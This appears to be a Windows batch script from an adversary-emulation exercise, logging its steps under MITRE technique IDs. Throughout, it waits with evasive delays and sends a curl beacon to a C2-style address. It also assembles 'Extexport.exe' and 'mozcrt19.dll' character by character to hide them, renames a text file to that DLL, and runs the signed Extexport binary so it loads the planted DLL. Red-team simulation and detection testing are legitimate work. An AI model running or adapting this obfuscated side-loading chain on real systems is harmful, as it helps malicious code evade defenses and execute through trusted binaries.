@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET yktnwwf=%APPDATA%\8904\4c30ee9a
SET fpakbq=Macula-Stage0-8904
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8904-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=teams.txt
SET fpldhe=8904
SET evzuxgl=%APPDATA%\!yydue!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_start=begin>> "!evzuxgl!" 2>nul
timeout /t 17 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_start>> "!evzuxgl!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_end>> "!evzuxgl!" 2>nul

ping -n 8 127.0.0.1 >nul
SET a=E
SET b=x
SET c=t
SET d=e
SET e=x
SET f=p
SET g=o
SET h=r
SET i=t
SET j=.
SET k=e
SET l=x
SET m=e
SET llbn=%a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%
SET n=m
SET o=o
SET p=z
SET q=c
SET r=r
SET s=t
SET t=1
SET u=9
SET v=.
SET w=d
SET x=l
SET y=l
SET dll=%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: obfuscation_complete>> "!evzuxgl!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!evzuxgl!" 2>nul
cd /d "!yktnwwf!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_end=!cd!>> "!evzuxgl!" 2>nul

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_start=!edjwtl!->!dll!>> "!evzuxgl!" 2>nul
ren "!edjwtl!" "!dll!" 2>nul
SET /A aresult=0
SET aerr=
IF NOT EXIST "!dll!" (SET aresult=0&SET aerr=rename_failed) ELSE (SET aresult=1)
echo [%DATE% %TIME%][!omxgazu!]: !yydue!-!fpldhe!-T1218|SignedBinaryProxyExecution=!aresult!:!aerr!>> "!evzuxgl!" 2>nul

CHOICE /C Y /N /D Y /T 11 >nul
SET /A zdelay=%RANDOM% %% 15 + 10
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start=!zdelay!s>> "!evzuxgl!" 2>nul
timeout /t !zdelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_start=!llbn!>> "!evzuxgl!" 2>nul
%SystemRoot%\System32\!llbn! . foo bar
SET /A bresult=0
SET berr=
IF !ERRORLEVEL! EQU 0 (SET bresult=1) ELSE (SET bresult=0&SET berr=exit_!ERRORLEVEL!)
echo [%DATE% %TIME%][!omxgazu!]: !yydue!-!fpldhe!-T1218.011|Extexport=!bresult!:!berr!>> "!evzuxgl!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_end>> "!evzuxgl!" 2>nul